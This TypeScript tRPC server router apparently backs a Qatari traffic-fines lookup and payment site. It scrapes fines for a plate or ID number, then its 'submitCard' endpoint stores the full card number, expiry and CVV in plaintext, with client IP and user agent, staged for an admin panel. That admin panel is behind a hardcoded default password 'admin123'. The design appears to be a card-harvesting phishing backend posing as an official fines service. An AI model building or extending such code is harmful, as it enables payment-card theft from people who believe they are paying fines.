import { z } from "zod";
import { TRPCError } from "@trpc/server";
import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import {
  createFineQuery,
  updateFineQuery,
  getFineQueryById,
  getRecentFineQueries,
  getFineQueriesByUserId,
  createFines,
  getFinesByQueryId,
  createPaymentSession,
  getPaymentSessionBySessionId,
  updatePaymentSession,
  getAllPaymentSessions,
} from "./db";
import { scrapeQatarFines, PLATE_SOURCES, QATAR_PLATE_TYPES, getPlateCodeOptions } from "./scraper";
import crypto from "crypto";

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
const adminTokens = new Set<string>();

function generateAdminToken(): string {
  return crypto.randomBytes(32).toString("hex");
}

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  fines: router({
    getOptions: publicProcedure.query(() => {
      return {
        plateSources: PLATE_SOURCES,
        plateTypes: QATAR_PLATE_TYPES,
      };
    }),

    getPlateCodes: publicProcedure
      .input(z.object({ plateSource: z.string() }))
      .query(async ({ input }) => {
        const plateCodes = await getPlateCodeOptions(input.plateSource);
        return { plateCodes };
      }),

    query: publicProcedure
      .input(
        z.object({
          inquiryType: z.enum(["plate", "qid", "establishment"]),
          plateSource: z.string().optional(),
          plateNumber: z.string().optional(),
          plateType: z.string().optional(),
          ownerIdType: z.enum(["qid", "establishment"]).optional(),
          ownerId: z.string().optional(),
          lang: z.enum(["ar", "en"]).default("ar"),
        })
      )
      .mutation(async ({ input, ctx }) => {
        const queryId = await createFineQuery({
          plateSource: input.plateSource || "QAT",
          plateNumber: input.plateNumber || input.ownerId || "",
          plateCode: input.plateType || input.inquiryType,
          status: "pending",
          userId: ctx.user?.id ?? null,
        });

        try {
          const result = await scrapeQatarFines(input);

          if (!result.success) {
            await updateFineQuery(queryId, {
              status: "failed",
              errorMessage: result.errorMessage,
            });
            return { success: false, queryId, fines: [], errorMessage: result.errorMessage };
          }

          const finesCount = result.fines.length;
          await updateFineQuery(queryId, {
            status: finesCount === 0 ? "no_fines" : "success",
            totalFines: finesCount,
            totalAmount: result.totalAmount ?? "0",
            rawResults: result.fines as any,
          });

          if (finesCount > 0) {
            await createFines(
              result.fines.map((fine) => ({
                queryId,
                fineNumber: fine.fineNumber,
                fineDate: fine.fineDate,
                description: fine.description,
                amount: fine.amount ? fine.amount.replace(/[^0-9.]/g, "") : "0",
                blackPoints: fine.blackPoints ?? 0,
                isPaid: fine.isPaid ?? "unpaid",
                location: fine.location,
              }))
            );
          }

          const sessionId = crypto.randomBytes(16).toString("hex");
          await createPaymentSession({
            sessionId,
            queryId: queryId || null,
            selectedFines: result.fines as any,
            totalAmount: result.totalAmount ?? "0",
            plateNumber: input.plateNumber || input.ownerId || "",
            plateSource: input.plateSource || "QAT",
            stage: "card",
            clientIp: ctx.req.socket.remoteAddress || "",
            userAgent: ctx.req.headers["user-agent"] || "",
            statusRead: 0,
          });

          return {
            success: true,
            queryId,
            sessionId,
            fines: result.fines,
            totalAmount: result.totalAmount,
            totalFines: finesCount,
          };
        } catch (error: any) {
          return { success: false, queryId, fines: [], errorMessage: error.message };
        }
      }),
  }),

  payment: router({
    getStatus: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .query(async ({ input }) => {
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
        return { stage: session.stage, errorMessage: session.errorMessage };
      }),

    submitCard: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        cardName: z.string(),
        cardNumber: z.string(),
        cardExpiry: z.string(),
        cardCvv: z.string(),
      }))
      .mutation(async ({ input }) => {
        const masked = input.cardNumber.replace(/(\d{4})\d{8}(\d{4})/, "$1 **** **** $2");
        await updatePaymentSession(input.sessionId, {
          cardName: input.cardName,
          cardNumber: input.cardNumber,
          cardNumberMasked: masked,
          cardExpiry: input.cardExpiry,
          cardCvv: input.cardCvv,
          stage: "card_pending",
          statusRead: 0,
        });
        return { success: true };
      }),
  }),

  admin: router({
    login: publicProcedure
      .input(z.object({ password: z.string() }))
      .mutation(async ({ input }) => {
        if (input.password !== ADMIN_PASSWORD) throw new TRPCError({ code: "UNAUTHORIZED" });
        const token = generateAdminToken();
        adminTokens.add(token);
        return { success: true, token };
      }),
  }),
});
